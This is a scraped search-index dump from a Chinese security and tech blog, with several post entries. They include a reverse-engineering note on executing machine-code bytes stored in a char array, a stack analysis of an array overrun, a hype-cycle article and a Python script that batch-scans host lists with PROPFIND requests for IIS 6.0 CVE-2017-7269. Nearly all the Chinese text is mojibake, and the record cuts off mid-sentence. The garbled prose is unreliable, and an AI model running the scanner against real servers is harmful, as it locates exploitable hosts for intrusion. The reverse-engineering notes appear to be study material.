target=\u0026#39;_blank\u0026#39;\u0026gt;ç½²å-éå•†ä¸šä½¿ç”¨-ç¦æ­¢æ¼”ç»\u0026lt;/a\u0026gt;\u0026lt;/h5\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;hr\u0026gt; {{previousAndNext}} {{ad}} \u0026lt;p\u0026gt; {{random}} \u0026lt;hr\u0026gt; \u0026lt;!-- æ¥å¿…åŠ›Cityç‰ˆå®‰è£…ä»£ç  --\u0026gt; \u0026lt;div id=\u0026#34;lv-container\u0026#34; data-id=\u0026#34;city\u0026#34; data-uid=\u0026#34;MTAyMC8yODAwMC80NTc3\u0026#34;\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; (function(d, s) { var j, e = d.getElementsByTagName(s)[0]; if (typeof LivereTower === \u0026#39;function\u0026#39;) { return; } j = d.createElement(s); j.src = \u0026#39;https://cdn-city.livere.com/js/embed.dist.js\u0026#39;; j.async = true; e.parentNode.insertBefore(j, e); })(document, \u0026#39;script\u0026#39;); \u0026lt;/script\u0026gt; \u0026lt;noscript\u0026gt; ä¸ºæ­£å¸¸ä½¿ç”¨æ¥å¿…åŠ›è¯„è®ºåŠŸèƒ½è¯·æ¿€æ´»JavaScript\u0026lt;/noscript\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- Cityç‰ˆå®‰è£…ä»£ç å·²å®Œæˆ --\u0026gt; {{contact}} {{bottomCopyright}} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æœ€åçš„æ•ˆæœå¦‚å›¾ æœ€åè¦è¯´çš„ è¿™ä¸ªå·¥å…·ç¡®å®æ˜¯ååˆ†æ–¹ä¾¿çš„ï¼Œå¦‚æœä½ ä½œä¸ºç¬”è®°ï¼Œå¯ä»¥ä½¿ç”¨åšæœäº‘æ¥åŒæ­¥ï¼ŒåŒæ—¶å®ƒå¯ä»¥æ‰“åŒ…ä½ çš„æ•°æ®ï¼Œå¤šè¯´æ— ç›Šï¼Œè¯•ç”¨ä¹‹åä½ ä¼šæ„Ÿå—åˆ°å®ƒçš„å¼ºå¤§\næœ¬æ–‡éƒ¨åˆ†è½¬è‡ªUnderwaysoft\n","permalink":"https://www.hacktech.cn/post/walden-tips-introdution.html","summary":"\u003ch2 id=\"ç®€ä»‹\"\u003eç®€ä»‹\u003c/h2\u003e\n\u003cp\u003eWDTPï¼ˆå±±æ¹–å½•ï¼‰ä¸æ­¢æ˜¯ä¸€æ¬¾å¼€æºå…è´¹çš„GUIæ¡Œé¢å•æœºç‰ˆé™æ€ç½‘ç«™ç”Ÿæˆå™¨å’Œç®€å•æ–¹ä¾¿çš„å‰ç«¯å¼€å‘å·¥å…·ï¼Œæ›´æ˜¯ä¸€æ¬¾è·¨å¹³å°çš„é›†ç¬”è®°ã€å½•éŸ³ã€ä¸ªäººçŸ¥è¯†ç®¡ç†ã€å†™ä½œ/åˆ›ä½œã€åšå®¢/ç½‘ç«™å†…å®¹ä¸æ ·å¼ç®¡ç†ç­‰åŠŸèƒ½äºä¸€ä½“çš„å¤šåˆä¸€å†…å®¹å¤„ç†/ç®¡ç†å™¨ï¼ŒåŒæ—¶è¿˜æ˜¯ä¸€æ¬¾é«˜åº¦è¿½æ±‚ç”¨æˆ·ä½“éªŒçš„Markdownæ–‡æœ¬ç¼–è¾‘å™¨å’Œä¸€æ¬¾æ–¹ä¾¿å¼ºå¤§çš„å½•éŸ³æœºã€‚æœ¬è½¯ä»¶ç ”å‘çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š\u003cstrong\u003eç®€æ´é«˜æ•ˆã€è½»çµä¼˜é›…ã€å…ˆè¿›å¼ºæ‚ã€æ“ä½œç®€å•\u003c/strong\u003eã€‚\u003c/p\u003e","title":"æ¨èä¸€ä¸ªé™æ€åšå®¢å…¼ç¬”è®°çš„å·¥å…·ï¼šWDTP"},{"content":"ä»£ç åœ°å€\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import subprocess f = open(\u0026#39;ips.txt\u0026#39;, \u0026#39;r\u0026#39;) flines = f.readlines() vulnsrvs = 0 i = 1 for line in flines: host = line.split(\u0026#34;:\u0026#34;) ip = host[0].replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;) port = host[1].replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;) print \u0026#34;Try (\u0026#34; + str(i) +\u0026#34;) \u0026#34;+ str(ip) +\u0026#34;:\u0026#34; + str(port) if port == \u0026#34;443\u0026#34;: #dont bother with SSL/TLS continue try: myout = subprocess.check_output([\u0026#39;curl\u0026#39;, \u0026#39;--connect-timeout\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;--max-time\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;-s\u0026#39;,\u0026#39;-I\u0026#39;, \u0026#39;-X\u0026#39;, \u0026#39;PROPFIND\u0026#39;,\u0026#39;http://\u0026#39; + ip + \u0026#39;:\u0026#39; + port + \u0026#39;/\u0026#39; ]) print myout if \u0026#34;HTTP/1.1 411 Length Required\u0026#34; in myout: print \u0026#34;Found one:\u0026#34; print myout vulnsrvs += 1 except Exception, e: print str(e.output) i += 1 print \u0026#34;Vulnerable: \u0026#34; + str(vulnsrvs) è¯´æ˜ ips.txt æ˜¯å¾…éªŒè¯çš„åˆ—è¡¨æ ¼å¼ä¸ºï¼š\n1 2 3 129.112.44.1:80 129.112.44.2:81 129.112.44.43:8808 å®ƒä¸æ£€æµ‹443ç«¯å£ï¼ˆHTTPSï¼‰ ä½ ä¹Ÿå¯ä»¥ç®€å•æ”¹ä¸€ä¸‹è¿›è¡Œç½‘æ®µæ‰¹é‡éªŒè¯ã€‚\nè½¬è‡ªç¾¤å‹CF_HB\n","permalink":"https://www.hacktech.cn/post/iis6-0-cve-2017-7269.html","summary":"\u003cp\u003e\u003ca href=\"https://gist.githubusercontent.com/iam1980/62ee37e38c7f76ca5d3889379e1d81fd/raw/aed9a3ef42bc6e6592913c5df8906ca6c57c9c66/getpro.py\"\u003eä»£ç åœ°å€\u003c/a\u003e\u003c/p\u003e","title":"iis6-0 cve-2017-7269 æ‰¹é‡éªŒè¯è„šæœ¬"},{"content":"æ¨èä¸€ä¸ªååˆ†å¥½çœ‹çš„å¼€æºåšå®¢ç³»ç»Ÿï¼Œç›´æ¥ç™¾åº¦â€œé‡Œç¨‹å¯†â€åœ°å€www.lcm.wang\né™„å›¾\nä¸»é¡µ\nåå°\næµ“æµ“çš„ç§‘æŠ€ç®€çº¦é£ï¼Œé€‚åˆåšæŠ€æœ¯çš„ä½ \n","permalink":"https://www.hacktech.cn/post/a-beautiful-open-source-blog-lcm.html","summary":"\u003cp\u003eæ¨èä¸€ä¸ªååˆ†å¥½çœ‹çš„å¼€æºåšå®¢ç³»ç»Ÿï¼Œç›´æ¥ç™¾åº¦â€œé‡Œç¨‹å¯†â€åœ°å€\u003ca href=\"http://www.lcm.wang/\"\u003ewww.lcm.wang\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eé™„å›¾\u003c/p\u003e\n\u003cp\u003eä¸»é¡µ\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://ooo.0o0.ooo/2017/03/12/58c53df6b41cf.png\" alt=\"snipaste_20170312_202041.png\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eåå°\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://ooo.0o0.ooo/2017/03/12/58c53e0b65eaa.png\" alt=\"snipaste_20170312_201924.png\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eæµ“æµ“çš„ç§‘æŠ€ç®€çº¦é£ï¼Œé€‚åˆåšæŠ€æœ¯çš„ä½ \u003c/p\u003e","title":"æ¨èä¸€ä¸ªååˆ†å¥½çœ‹çš„å¼€æºåšå®¢ç³»ç»Ÿ"},{"content":"å…¨çƒæœ€å¤§çš„ IT å’¨è¯¢å…¬å¸é«˜å¾·çº³ï¼ˆGartnerï¼‰ï¼Œæœ‰ä¸€ä¸ª\u0026quot;æŠ€æœ¯çƒ­é—¨åº¦æ›²çº¿\u0026ldquo;æ¨¡å‹ï¼ˆGartner Hype Cycleï¼‰ã€‚\nè¯¥æ¨¡å‹è®¤ä¸ºï¼Œä¸€é—¨æŠ€æœ¯çš„å‘å±•è¦ç»å†äº”ä¸ªé˜¶æ®µã€‚\nå¯åŠ¨æœŸï¼ˆInnovation Triggerï¼‰ è¯¥æŠ€æœ¯åˆšåˆšè¯ç”Ÿï¼Œè¿˜åªæ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œä¸å…·æœ‰å¯ç”¨æ€§ï¼Œæ— æ³•è¯„ä¼°å•†ä¸šæ½œåŠ›ã€‚åª’ä½“æœ‰æ‰€æŠ¥é“ï¼Œå¼•èµ·äº†å¤–ç•Œçš„å…´è¶£ã€‚\næ³¡æ²«æœŸï¼ˆPeak of Inflated Expectationsï¼‰ è¯¥æŠ€æœ¯é€æ­¥æˆå‹ï¼Œå‡ºç°äº†ä¸ªåˆ«æˆåŠŸçš„æ¡ˆä¾‹ï¼Œä¸€äº›æ¿€è¿›çš„å…¬å¸å¼€å§‹è·Ÿè¿›ã€‚åª’ä½“å¼€å§‹å¤§è‚†æŠ¥å¯¼ï¼Œä¼´æœ‰å„ç§éç†æ€§çš„æ¸²æŸ“ï¼Œäº§å“çš„çŸ¥ååº¦è¾¾åˆ°é«˜å³°ã€‚\nä½è°·æœŸï¼ˆTrough of Disillusionmentï¼‰ è¯¥æŠ€æœ¯çš„å±€é™å’Œç¼ºç‚¹é€æ­¥æš´éœ²ï¼Œå¯¹å®ƒçš„å…´è¶£å¼€å§‹å‡å¼±ã€‚åŸºäºå®ƒçš„äº§å“ï¼Œå¤§éƒ¨åˆ†è¢«å¸‚åœºæ·˜æ±°æˆ–è€…å¤±è´¥ï¼Œåªæœ‰é‚£äº›æ‰¾åˆ°æ—©æœŸç”¨æˆ·çš„å…¬å¸è‰°éš¾åœ°æ´»äº†ä¸‹æ¥ã€‚åª’ä½“å¯¹å®ƒçš„æŠ¥é“é€æ­¥å†·å´ï¼Œå‰æ™¯ä¸æ˜ã€‚\nçˆ¬å‡æœŸï¼ˆSlope of Enlightenmentï¼‰ è¯¥æŠ€æœ¯çš„ä¼˜ç¼ºç‚¹è¶Šæ¥è¶Šæ˜æ˜¾ï¼Œç»†èŠ‚é€æ¸æ¸…æ™°ï¼Œè¶Šæ¥è¶Šå¤šçš„äººå¼€å§‹ç†è§£å®ƒã€‚åŸºäºå®ƒçš„ç¬¬äºŒä»£å’Œç¬¬ä¸‰ä»£äº§å“å‡ºç°ï¼Œæ›´å¤šçš„ä¼ä¸šå¼€å§‹å°è¯•ï¼Œå¯å¤åˆ¶çš„æˆåŠŸä½¿ç”¨æ¨¡å¼å‡ºç°ã€‚åª’ä½“é‡æ–°è®¤è¯†å®ƒï¼Œä¸šç•Œè¿™ä¸€æ¬¡ç»™äºˆäº†é«˜åº¦çš„ç†æ€§çš„å…³æ³¨ã€‚\né«˜åŸæœŸï¼ˆPlateau of Productivityï¼‰ ç»è¿‡ä¸æ–­å‘å±•ï¼Œè¯¥æŠ€æœ¯æ…¢æ…¢æˆä¸ºäº†ä¸»æµã€‚æŠ€æœ¯æ ‡å‡†å¾—åˆ°äº†æ¸…æ™°å®šä¹‰ï¼Œä½¿ç”¨èµ·æ¥è¶Šå‘æ–¹ä¾¿å¥½ç”¨ï¼Œå¸‚åœºå æœ‰ç‡è¶Šæ¥è¶Šé«˜ï¼Œè¿›å…¥ç¨³å®šåº”ç”¨é˜¶æ®µã€‚é…åˆå®ƒçš„å·¥å…·å’Œæœ€ä½³å®è·µï¼Œç»è¿‡æ•°ä»£çš„æ¼”è¿›ï¼Œä¹Ÿå˜å¾—éå¸¸æˆç†Ÿäº†ã€‚ä¸šç•Œå¯¹å®ƒæœ‰äº†å…¬è®¤çš„ä¸€è‡´çš„è¯„ä»·ã€‚\nè¯¥æ¨¡å‹çš„ç»†èŠ‚å¯ä»¥æŸ¥çœ‹ç»´åŸºç™¾ç§‘çš„å¤§å›¾ã€‚\né«˜å¾·çº³å…¬å¸æ¯å¹´éƒ½ä¼šå…¬å¸ƒï¼Œå½“å¹´çš„çƒ­é—¨æŠ€æœ¯å›¾ã€‚ä¸‹é¢å°±æ˜¯å»å¹´ä¸ƒæœˆçš„å›¾ã€‚\nä¸Šå›¾ä¸­ï¼Œ4Dæ‰“å°å¤„äº\u0026quot;å¯åŠ¨æœŸ\u0026rdquo;ï¼ŒåŒºå—é“¾å¤„äº\u0026quot;æ³¡æ²«æœŸ\u0026quot;ï¼Œå¢å¼ºç°å®å¤„äº\u0026quot;ä½è°·æœŸ\u0026quot;ï¼Œè™šæ‹Ÿç°å®å¤„äºçˆ¬å‡æœŸã€‚\næœ¬å‘¨ï¼Œæœ‰äººè¿›è¡Œæ•°æ®åˆ†æåï¼Œå»ºç«‹äº†ä¸€ä¸ªåå« State.of.Dev çš„ç½‘ç«™ï¼Œæä¾›å„ç§æŠ€æœ¯çš„çƒ­é—¨ç¨‹åº¦å›¾ã€‚\nä¸‹å›¾æ˜¯ç¼–ç¨‹è¯­è¨€ã€‚\nä¸Šå›¾ä¸­ï¼ŒRust è¯­è¨€å¤„äºå¯åŠ¨æœŸï¼ŒGo è¯­è¨€å¤„äºæ³¡æ²«æœŸï¼ŒRuby è¯­è¨€å¤„äºä½è°·æœŸï¼ŒObject-C å¤„äºçˆ¬å‡æœŸï¼ŒPHP å’Œ Java å¤„äºé«˜åŸæœŸã€‚\nä¸‹å›¾æ˜¯ Web æŠ€æœ¯ã€‚\nä¸Šå›¾ä¸­ï¼ŒWebAssembly å¤„äºå¯åŠ¨æœŸï¼ŒWebRTC å¤„äºä½è°·æœŸï¼ŒHTTPS å¤„äºé«˜åŸæœŸã€‚\nä¸€é—¨æŠ€æœ¯åˆ°åº•å‰æ™¯å¦‚ä½•ï¼Œå¾ˆéš¾é¢„æµ‹ï¼Œä½†æ˜¯å®ƒçš„çƒ­é—¨ç¨‹åº¦å´æ˜¯å¯ä»¥è¡¡é‡çš„ï¼ˆæ¯”å¦‚åœ¨ç¤¾äº¤åª’ä½“æåŠæ¬¡æ•°çš„å¢é•¿å¹…åº¦ï¼‰ã€‚é£é™©æŠ•èµ„è·Ÿçƒ­é—¨ç¨‹åº¦é«˜åº¦æ­£ç›¸å…³ï¼Œè¶Šçƒ­é—¨çš„æŠ€æœ¯è¶Šå®¹æ˜“æ‹¿åˆ°æŠ•èµ„ã€‚\nç”¨æˆ·å¯ä»¥é‡‡ç”¨è¿™å¼ å›¾ï¼Œåˆ¤æ–­æŠ€æœ¯å¤„åœ¨å“ªä¸€ä¸ªé˜¶æ®µï¼Œç¡®å®šå®ƒçš„çƒ­é—¨ç¨‹åº¦ã€‚ç®€å•çš„ä½¿ç”¨è§„åˆ™å¦‚ä¸‹ã€‚\n\u0026ldquo;äº‰å–é£é™©æŠ•èµ„ï¼Œè¦é€‰æ‹©çƒ­é—¨çš„æŠ€æœ¯ï¼›è§£å†³å®é™…é—®é¢˜ï¼Œ è¦é€‰æ‹©å¯é çš„æŠ€æœ¯ã€‚\u0026rdquo;\nç®€å•è¯´ï¼Œå¤„äºå¯åŠ¨æœŸçš„æŠ€æœ¯ï¼Œé£é™©å¾ˆå¤§ï¼Œä¸ç¡®å®šæ€§æé«˜ï¼Œä½†æ˜¯ä¸€æ—¦æˆåŠŸï¼Œå›æŠ¥å¯èƒ½ä¹Ÿå¾ˆé«˜ï¼Œé€‚åˆåˆ›ä¸šå…¬å¸ï¼›å¤„äºé«˜åŸæœŸçš„æŠ€æœ¯ï¼Œéå¸¸å¯é ï¼Œé£é™©ä½ï¼Œæœ‰æˆç†Ÿçš„è§£å†³æ–¹æ¡ˆå’Œé…å¥—å·¥å…·ï¼Œé€‚åˆå¤§å…¬å¸å’Œä¼ä¸šçš„å†…éƒ¨åº”ç”¨ã€‚\nåè¿‡æ¥è¯´ï¼Œå¦‚æœä¸€é—¨æŠ€æœ¯å¤„äºé«˜åŸæœŸäº†ï¼Œå°±ä»£è¡¨å®ƒéå¸¸æˆç†Ÿäº†ï¼Œäººä»¬å¯¹å®ƒèƒ½å¹²ä»€ä¹ˆå’Œä¸èƒ½å¹²ä»€ä¹ˆï¼Œéƒ½å·²ç»å¾ˆäº†è§£äº†ï¼Œä¹Ÿæ²¡æœ‰æ–°çš„æœŸå¾…äº†ï¼ŒæŠ€æœ¯æœ¬èº«çš„æ½œåŠ›å·²ç»ä¸å¤§äº†ï¼Œæ‰€ä»¥ç”¨å®ƒæ‹¿ä¸åˆ°æŠ•èµ„ï¼Œåªèƒ½ç”¨æ¥å¹²æ´»ã€‚\nï¼ˆå®Œï¼‰\nè½¬è½½è‡ªé˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿—\n","permalink":"https://www.hacktech.cn/post/technology-s-popularity-curve.html","summary":"\u003cp\u003eå…¨çƒæœ€å¤§çš„ IT å’¨è¯¢å…¬å¸\u003ca href=\"http://baike.baidu.com/item/Gartner\"\u003eé«˜å¾·çº³\u003c/a\u003eï¼ˆGartnerï¼‰ï¼Œæœ‰ä¸€ä¸ª\u0026quot;\u003ca href=\"http://www.gartner.com/technology/research/methodologies/hype-cycle.jsp\"\u003eæŠ€æœ¯çƒ­é—¨åº¦æ›²çº¿\u003c/a\u003e\u0026ldquo;æ¨¡å‹ï¼ˆGartner Hype Cycleï¼‰ã€‚\u003c/p\u003e\n\u003cp\u003eè¯¥æ¨¡å‹è®¤ä¸ºï¼Œä¸€é—¨æŠ€æœ¯çš„å‘å±•è¦ç»å†äº”ä¸ªé˜¶æ®µã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://ooo.0o0.ooo/2017/03/12/58c4de8267e76.png\" alt=\"bg2017030301.png\"  /\u003e\n\u003c/p\u003e","title":"æŠ€æœ¯çš„çƒ­é—¨åº¦æ›²çº¿"},{"content":"ä»¥ä¸‹çš„ideä¸ºCodeBlocksï¼Œç¼–è¯‘å™¨é‡‡ç”¨çš„GCCï¼Œç³»ç»Ÿä¸ºwin10 64bit,åœ¨ä¸åŒç¼–è¯‘å™¨å’Œç¯å¢ƒä¸‹æ±‡ç¼–ä»£ç å¯èƒ½ä¸åŒ\nç°è±¡ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int getmin(int a, int b) { if(a\u0026gt;b) return b; else return a; } typedef int (*pfunction)(int, int); int main() { int a=456789,b=123789,c=0; pfunction pGetmin = (pfunction)getmin; c = pGetmin(a, b); printf(\u0026#34;%d\u0026#34;,c); return 0; } ä¸Šé¢è¿™æ®µä»£ç æ˜¯æ¯”å¤§å°è¾“å‡ºå°çš„ï¼Œtypedef int (*pfunction)(int, int);å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä½†æ˜¯ä¸‹é¢è¿™æ®µä»£ç å’Œä¸Šé¢çš„åŠŸèƒ½æ˜¯å®Œå…¨ä¸€æ ·çš„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; typedef int (*pfunction)(int, int); int main() { int a=456789,b=123789,c=0; unsigned char loc[] = { 0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0x3B, 0x45, 0x0C, 0x7E, 0x05, 0x8B, 0x45, 0x0C, 0xEB, 0x03, 0x8B, 0x45, 0x08, 0x5D, 0xC3 }; pfunction getmin = (pfunction)\u0026amp;loc; c = getmin(a, b); printf(\u0026#34;%d\u0026#34;,c); return 0; } åŸå› åˆ†æ å½“c = pGetmin(a, b);è°ƒç”¨pGetminçš„æ—¶å€™ï¼Œåœ¨æ±‡ç¼–ä¸­æ˜¯å…ˆcallè·³åˆ°ä¸€ä¸ªåœ°å€ç„¶åä»é‚£ä¸ªåœ°å€å†jmpåˆ°å‡½æ•°å…¥å£åœ°å€ç„¶åå¼€å§‹æ‰§è¡Œå‡½æ•° getminå‡½æ•°æ•´ä½“æ±‡ç¼–ä¸º\n1 2 3 4 5 6 7 8 9 10 push ebp mov ebp,esp mov eax,DWORD PTR [ebp+0x8] cmp eax,DWORD PTR [ebp+0xc] jle \u0026lt;getmin+16\u0026gt; mov eax,DWORD PTR [ebp+0xc] jmp \u0026lt;getmin+19\u0026gt; mov eax,DWORD PTR [ebp+0x8] pop ebp ret é€šè¿‡ä¸€äº›è°ƒè¯•ç¨‹åºï¼ˆå‘ç°CodeBlockså¸¦çš„æ±‡ç¼–è°ƒè¯•æ²¡æœ‰vc6å¥½ç”¨ï¼Œçœ‹ä¸åˆ°ç¡¬ç¼–ç ï¼‰å¯ä»¥å¾—å‡ºè¿™æ®µæ±‡ç¼–ä»£ç åœ¨ç¡¬ç¼–ç ä¸­çš„å€¼ä¸º\n1 0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0x3B, 0x45, 0x0C, 0x7E, 0x05, 0x8B, 0x45, 0x0C, 0xEB, 0x03, 0x8B, 0x45, 0x08, 0x5D, 0xC3 è¿™æ®µæ•°æ®æˆ‘ä»¬åœ¨ç¬¬äºŒä¸ªä»£ç ä¸­æŠŠå®ƒå­˜å…¥äº†ä¸€ä¸ªcharç±»å‹çš„æ•°ç»„ï¼Œå®ƒè™½ç„¶åœ¨æ•°æ®åŒºï¼Œä½†æ˜¯å®ƒè¿˜æ˜¯å¯ä»¥çœ‹ä½œå¯è¿è¡Œçš„ä¸€æ®µå‡½æ•°ä»£ç ï¼Œæˆ‘ä»¬ä¾æ—§å®šä¹‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæŒ‡å‘è¿™ä¸ªcharç±»å‹æ•°ç»„çš„å…¥å£åœ°å€ï¼Œè¾¾åˆ°äº†å’Œç¬¬ä¸€ç§ç›¸åŒçš„æ•ˆæœ åœ¨ç¼–ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ˜¯æŠŠä»£ç å’Œæ•°æ®åˆ†å¾—å¾ˆå¼€çš„ï¼Œä½†æ˜¯åœ¨é€†å‘å’Œæ±‡ç¼–ä¸­ï¼Œè¿™ä¸ªåŒºåˆ«å°±ä¸æ˜æ˜¾äº†ï¼Œåœ¨è®¡ç®—æœºä¸­éƒ½æ˜¯ä»¥æ•°æ®å½¢å¼å­˜åœ¨çš„ï¼Œä½ å¯ä»¥è¯´å®ƒæ˜¯ä¸€ä¸²æ•°æ®ï¼Œä¹Ÿå¯ä»¥è¯´å®ƒæ˜¯ä»£ç \nè½¬è½½è¯·æ³¨æ˜å‡ºå¤„\n","permalink":"https://www.hacktech.cn/post/reverse-engineering-study-note-2-is-this-code-or-data.html","summary":"\u003cp\u003e\u003cstrong\u003eä»¥ä¸‹çš„ideä¸ºCodeBlocksï¼Œç¼–è¯‘å™¨é‡‡ç”¨çš„GCCï¼Œç³»ç»Ÿä¸ºwin10 64bit,åœ¨ä¸åŒç¼–è¯‘å™¨å’Œç¯å¢ƒä¸‹æ±‡ç¼–ä»£ç å¯èƒ½ä¸åŒ\u003c/strong\u003e\u003c/p\u003e","title":"é€†å‘å­¦ä¹ ç¬”è®°ï¼ˆ2ï¼‰-è¿™æ˜¯ä»£ç è¿˜æ˜¯æ•°æ®"},{"content":"å¯¹äºä¸‹é¢è¿™æ®µcè¯­è¨€ä»£ç ä¼šä¸€ç›´ä¸åœåœ°å¾ªç¯ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include\u0026lt;stdio.h\u0026gt; void HelloWorld() { int i = 0; int a[] = {1,2,3,4,5,6,7,8,9,10}; for(i=0; i\u0026lt;=10; i++) { a[i] = 0; printf(\u0026#34;Hello World!\\n\u0026#34;); } } int main(int argc, char* argv[]) { HelloWorld(); getchar(); return 0; } é—®é¢˜ å½“ä½ è¿è¡Œä¸Šé¢è¿™ä¸²ä»£ç çš„æ—¶å€™ï¼Œå› ä¸ºcè¯­è¨€å¹¶ä¸ä¼šå¯¹æ•°ç»„è¶Šç•Œè¿›è¡Œæ£€æŸ¥ï¼Œæ‰€ä»¥æ˜¯ä¸ä¼šæŠ¥é”™å¯ä»¥ç›´æ¥è¿è¡Œçš„ï¼Œé‚£ä¹ˆæ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´äº†ä¸‹é¢è¿™å¼ å›¾çš„ç»“æœå‘¢ï¼Ÿ\nåˆ†æ æˆ‘ä»¬å¯ä»¥è°ƒè¯•è·Ÿè¿›çœ‹çœ‹ï¼Œåœ¨HelloWorldå‡½æ•°ä¸ŠåŠ ä¸€ä¸ªæ–­ç‚¹è·Ÿè¿›å»çœ‹çœ‹\nè¿™ä¸ªå‡½æ•°ä¸»è¦çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 8: int i = 0; 00401038 mov dword ptr [ebp-4],0 9: int a[] = {1,2,3,4,5,6,7,8,9,10}; 0040103F mov dword ptr [ebp-2Ch],1 00401046 mov dword ptr [ebp-28h],2 0040104D mov dword ptr [ebp-24h],3 00401054 mov dword ptr [ebp-20h],4 0040105B mov dword ptr [ebp-1Ch],5 00401062 mov dword ptr [ebp-18h],6 00401069 mov dword ptr [ebp-14h],7 00401070 mov dword ptr [ebp-10h],8 00401077 mov dword ptr [ebp-0Ch],9 0040107E mov dword ptr [ebp-8],0Ah 10: for(i=0; i\u0026lt;=10; i++) 00401085 mov dword ptr [ebp-4],0 0040108C jmp HelloWorld+77h (00401097) 0040108E mov eax,dword ptr [ebp-4] 00401091 add eax,1 00401094 mov dword ptr [ebp-4],eax 00401097 cmp dword ptr [ebp-4],0Ah 0040109B jg HelloWorld+97h (004010b7) 11: { 12: a[i] = 0; 0040109D mov ecx,dword ptr [ebp-4] 004010A0 mov dword ptr [ebp+ecx*4-2Ch],0 13: printf(\u0026#34;Hello World!\\n\u0026#34;); 004010A8 push offset string \u0026#34;Hello World!\\n\u0026#34; (0042301c) 004010AD call printf (004011a0) 004010B2 add esp,4 14: } 004010B5 jmp HelloWorld+6Eh (0040108e) 15: } ä»int i = 0;å¼€å§‹çœ‹ç›´åˆ°for(i=0; i\u0026lt;=10; i++)çš„å †æ ˆå›¾æ˜¯\nç¬¬ä¸€æ¬¡è¿›å…¥å¾ªç¯å¼€å§‹å…ˆæŠŠ0æ”¾åˆ°äº†[ebp-4]ï¼Œç„¶åè·³åˆ°äº†00401097 cmp dword ptr [ebp-4],0Ahä»¥åŠä¸‹é¢çš„jgï¼Œè¿™é‡Œçš„æ„æ€æ˜¯å¦‚æœebp-4ä¸­å­˜æ”¾çš„å€¼æ¯”0Aå¤§é‚£ä¹ˆå°±æ‰§è¡Œjg HelloWorld+97h (004010b7)è·³åˆ°004010b7å‡½æ•°ç»“æŸ ç¬¬ä¸€æ¬¡è¿›å…¥å¾ªç¯æ—¶ï¼Œcmpä¹‹åï¼ˆebp-4ä¸­å­˜æ”¾çš„å€¼æ¯”0Aå°ï¼‰æ‰§è¡Œ0040109Då¤„çš„è¯­å¥ï¼Œæ­¤æ—¶ECXä¸­çš„å€¼å˜æˆäº†[ebp-4]ä¸­çš„å€¼ä¹Ÿå°±æ˜¯0ï¼Œç„¶åmov dword ptr [ebp+ecx*4-2Ch],0å°†0æ”¾åˆ°ebp+ecx*4-2Chå¤„ä¹Ÿå°±æ˜¯EBP-2Cå¤„ï¼Œä¸‹é¢çš„ä¸¤æ¡è¯­å¥ä¸ç”¨ç®¡æ˜¯æ‰§è¡Œè¾“å‡ºçš„ï¼Œç„¶ååˆ°äº†add esp,4å°†æ ˆé¡¶çš„å€¼åŠ 4ï¼Œè¿™é‡Œæˆ‘ä»¬æ— éœ€å…³æ³¨æ ˆé¡¶ï¼Œç„¶åjmp HelloWorld+6Eh (0040108e)è·³å›åˆ°0040108eç»§ç»­æ‰§è¡Œ\nè·³åˆ°0040108E mov eax,dword ptr [ebp-4]å¼€å§‹æ‰§è¡Œï¼Œç´§æ¥ç€è¿™ä¸‰æ¡è¯­å¥çš„ä½œç”¨æ˜¯æŠŠEBP-4ä¸­çš„å€¼åŠ äº†1ï¼Œä¹Ÿå°±æ˜¯EBP-4ä¸­çš„å€¼ç°åœ¨ä¸º1\n1 2 3 mov eax,dword ptr [ebp-4] add eax,1 mov dword ptr [ebp-4],eax cmpæ¯”è¾ƒä¹‹åå†æ¬¡æ‰§è¡Œå¾ªç¯ä½“ï¼Œå¾ªç¯ä½“å®Œæˆåå†æ¬¡è·³åˆ°0040108eï¼Œæ­¤æ—¶EBP-28çš„å€¼å˜ä¸ºäº†0ï¼Œæ ˆé¡¶espå†æ¬¡å¢åŠ äº†4ï¼ˆè¿™ä¸ªä¾‹å­ä¸­æ ˆé¡¶æ˜¯ä¸ç”¨å…³æ³¨çš„ï¼‰\nç´§æ¥ç€ä¸‹æ¬¡æ‰§è¡Œå\nç›´åˆ°è¿™ä¸ªæ•°ç»„é•¿åº¦ä¸º10çš„æ•°ç»„æ‰§è¡Œåˆ°ç¬¬åæ¬¡\næ­¤æ—¶å†æ¬¡è·³è½¬åˆ°0040108eï¼Œç„¶åEBP-4ä¸­çš„å€¼å†æ¬¡å¢åŠ 